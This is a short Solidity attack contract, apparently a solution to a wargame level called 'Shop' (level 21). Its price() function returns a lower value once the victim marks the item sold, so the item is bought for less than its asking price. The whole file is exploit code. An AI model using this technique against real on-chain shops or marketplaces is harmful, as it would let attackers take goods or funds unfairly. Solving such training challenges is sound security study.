// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/21-IShop.sol";

contract ShopAttack {
    IShop public immutable victimShop;

    constructor(IShop victimShop_) {
        victimShop = victimShop_;
    }

    function price() external view returns (uint256) {
        return victimShop.price() - (victimShop.isSold() ? 1 : 0);
    }

    function attack() external {
        uint256 price_ = victimShop.price();

        victimShop.buy();

        require(victimShop.isSold() && price_ > victimShop.price(), "Shop: Attack failed");
    }
}
